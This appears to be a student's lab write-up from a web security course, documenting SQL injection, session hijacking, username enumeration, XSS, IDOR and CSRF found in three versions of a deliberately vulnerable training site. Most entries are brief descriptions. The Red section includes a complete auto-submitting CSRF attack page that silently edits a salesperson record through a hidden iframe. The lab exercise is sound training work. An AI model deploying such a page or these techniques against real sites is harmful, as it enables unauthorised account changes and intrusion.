# Project 8 - Pentesting Live Targets

Time spent: **7** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:

* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each color is vulnerable to only 2 of the 6 possible exploits. First discover which color has the specific vulnerability, then write a short description of how to exploit it, and finally demonstrate it using screenshots compiled into a GIF.

## Blue

Vulnerability #1: SQL Injection

Description: When an SQL Injection is performed in the URL for the id with a "'" after the id value we get a Database Query Failed which is not present in other sites like the green and the red. This means that the Blue is not sanatizing the input properly.

<img src="http://g.recordit.co/aUAfU46Xqi.gif">


Vulnerability #2: Session Hijacking/Fixation

Description: This shows how in the Blue site when the Session ID was taken from one broswer and that same Session ID was used in browser that needed to be attacked, the attacked broswer once Session ID was changed the page was logged into. 

<img src="http://g.recordit.co/CXUME0aTWJ.gif">



## Green

Vulnerability #1: Username Enumeration

Description: The bold text that is returned when we use "jmonroe99" as the username and and standard text returned when we use "hacker" as the username tells us as hackers that "jmonroe99" is in the database and "hacker" is not. This is username enumeration vulnerability becuase the system gave information regarding which is a correct and wrong username with the use of bold text. 

<img src="http://g.recordit.co/5wCwKNN9VV.gif">

Vulnerability #2: Cross-Site Scripting

Description: This shows how when a script was put into the contact us form, the script was able to get executed and showed up in the feedback tab. 

<img src="http://g.recordit.co/96WgGM2QMX.gif">


## Red

Vulnerability #1: Insecure Direct Object Reference

Description: This one shows how changing the ID in the URL of the site caused a leakage of data such a non-public user which was not suppose to be shown to a user like me. 

<img src="http://g.recordit.co/bB1RVWjluf.gif">

Vulnerability #2: Cross-Site Request Forgery

Code Block:
```
<!doctype html>
<html lang="en">
  <head>
    <title></title>
  </head>
  <body onload="document.ohnoForm.submit()">
  <h1>Some random important content</h1>
  <h2>definitely not a trap.</h2>
    <form name="ohnoForm" action="https://35.184.88.145/red/public/staff/salespeople/show.php?id=3" method="POST" style="display: none;" target="secretIFrame" > <br />
      <input type="hidden" name="csrf_token" value="" /> <br />
      <input type="text" name="first_name" value="Oh" /> <br />
      <input type="text" name="last_name" value="No" /> <br />
      <input type="text" name="phone" value="555-867-5309" /><br />
      <input type="text" name="email" value="bleh@example.org" /><br />
    </form>
    <iframe name="secretIFrame" style="display:none;"></iframe>
  </body>
</html>
```

Description: This one shows how through the use of a html inputted into a contact us form was able to get executed and change a salesperson first and last name without even being logged into that particular user. 

<img src="http://g.recordit.co/s81R3gbEvc.gif">


## Notes

Describe any challenges encountered while doing the work

